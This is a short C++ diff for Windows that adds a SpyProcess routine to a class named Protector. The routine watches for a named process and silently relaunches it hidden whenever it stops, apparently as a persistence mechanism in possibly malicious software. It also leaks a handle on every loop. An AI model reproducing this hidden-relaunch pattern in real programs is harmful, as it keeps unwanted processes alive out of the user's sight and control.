@@ -84,3 +84,29 @@ void Protector::AntiProcesses() {
 		Sleep(3000);
 	}
 }
+
+void Protector::SpyProcess(_SpyProcess* SP) {
+	HANDLE hSnap = NULL;
+	PROCESSENTRY32 pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	std::string process = "";
+	while (true) {
+		bool founded = false;
+		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+		if (hSnap != NULL) {
+			if (Process32First(hSnap, &pe32)) {
+				do {
+					if (std::string(pe32.szExeFile).find(SP->procName) != std::string::npos) {
+						founded = true;
+					}
+				} while (Process32Next(hSnap, &pe32));
+			}
+		}
+		
+		if (!founded)
+			ShellExecuteA(0, "open", SP->procPath, "protected", 0, SW_HIDE);
+
+		Sleep(1000);
+	}
+}
